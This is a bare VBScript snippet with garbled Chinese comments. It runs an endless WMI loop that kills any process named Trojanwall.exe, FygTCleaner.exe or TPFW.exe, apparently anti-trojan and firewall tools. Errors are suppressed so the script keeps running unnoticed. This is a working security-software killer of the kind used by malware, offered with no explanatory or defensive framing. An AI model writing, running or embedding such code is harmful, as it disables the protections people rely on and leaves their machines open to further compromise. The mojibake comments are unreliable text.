on error resume next

do while true
     for each ps in getobject("winmgmts:\\.\root\cimv2:win32_process").instances_  'ѭ������ 
  if ps.name="Trojanwall.exe" or ps.name="FygTCleaner.exe" or ps.name="TPFW.exe"    then  '�ر�QQ,Ҳ���Ըĳ������ĳ���
                 ps.terminate
           end if
     next 
     wscript.sleep 1
loop 